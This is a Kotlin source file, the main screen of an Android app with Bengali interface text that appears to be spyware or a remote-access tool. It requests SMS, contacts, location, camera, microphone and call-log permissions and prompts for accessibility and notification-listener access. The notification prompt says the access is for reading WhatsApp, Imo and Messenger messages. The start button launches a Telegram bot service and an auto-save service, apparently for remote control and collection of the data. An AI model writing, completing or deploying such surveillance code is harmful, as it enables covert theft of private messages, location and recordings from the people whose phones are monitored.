package com.yourapp.control

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var tvStatus: TextView
    private lateinit var btnStart: Button
    private lateinit var btnPermissions: Button

    private val permissions = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_PHONE_STATE
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvStatus = findViewById(R.id.tvStatus)
        btnStart = findViewById(R.id.btnStart)
        btnPermissions = findViewById(R.id.btnPermissions)

        // Initialize
        Features.init(this)
        SecureStorage.init(this)

        btnPermissions.setOnClickListener { requestAllPermissions() }
        btnStart.setOnClickListener {
            startService(Intent(this, TelegramBotService::class.java))
            startService(Intent(this, AutoSaveService::class.java))
            Toast.makeText(this, "সার্ভিস চালু হয়েছে", Toast.LENGTH_SHORT).show()
        }

        checkPermissionsAndStatus()
    }

    private fun requestAllPermissions() {
        val missingPermissions = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                REQUEST_CODE_PERMISSIONS
            )
        } else {
            Toast.makeText(this, "সব পারমিশন ইতিমধ্যে দেওয়া আছে", Toast.LENGTH_SHORT).show()
        }

        // Overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            startActivityForResult(intent, REQUEST_CODE_OVERLAY)
        }

        // Accessibility
        if (!isAccessibilityEnabled()) showAccessibilityDialog()

        // Notification permission
        if (!isNotificationListenerEnabled()) showNotificationDialog()

        // Battery optimization
        requestIgnoreBatteryOptimizations()
    }

    private fun isAccessibilityEnabled(): Boolean {
        val serviceName = "$packageName/${AccessibilityService::class.java.canonicalName}"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabledServices.contains(serviceName)
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val enabledListeners = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        ) ?: return false
        return enabledListeners.contains(packageName)
    }

    private fun showAccessibilityDialog() {
        AlertDialog.Builder(this)
            .setTitle("Accessibility Service প্রয়োজন")
            .setMessage("অ্যাপটি সঠিকভাবে কাজ করতে Accessibility Service চালু করতে হবে।\n\n" +
                    "1. Settings → Accessibility\n" +
                    "2. আপনার অ্যাপ নির্বাচন করুন\n" +
                    "3. On করুন")
            .setPositiveButton("সেটিংসে যান") { _, _ ->
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            .setNegativeButton("পরে", null)
            .show()
    }

    private fun showNotificationDialog() {
        AlertDialog.Builder(this)
            .setTitle("নোটিফিকেশন পারমিশন প্রয়োজন")
            .setMessage("WhatsApp, Imo, Messenger এর বার্তা দেখতে নোটিফিকেশন পারমিশন দিন।")
            .setPositiveButton("সেটিংসে যান") { _, _ ->
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            }
            .setNegativeButton("পরে", null)
            .show()
    }

    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
            startActivity(intent)
        }
    }

    private fun checkPermissionsAndStatus() {
        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val accessibilityOn = isAccessibilityEnabled()

        tvStatus.text = when {
            allGranted && accessibilityOn -> "✅ সব পারমিশন সক্রিয়"
            allGranted -> "⚠️ Accessibility চালু নেই"
            else -> "⚠️ কিছু পারমিশন দেওয়া হয়নি"
        }
        tvStatus.setTextColor(
            when {
                allGranted && accessibilityOn -> ContextCompat.getColor(this, android.R.color.holo_green_dark)
                allGranted -> ContextCompat.getColor(this, android.R.color.holo_orange_dark)
                else -> ContextCompat.getColor(this, android.R.color.holo_red_dark)
            }
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            checkPermissionsAndStatus()
        }
    }

    companion object {
        private const val REQUEST_CODE_PERMISSIONS = 1001
        private const val REQUEST_CODE_OVERLAY = 1002
    }
}
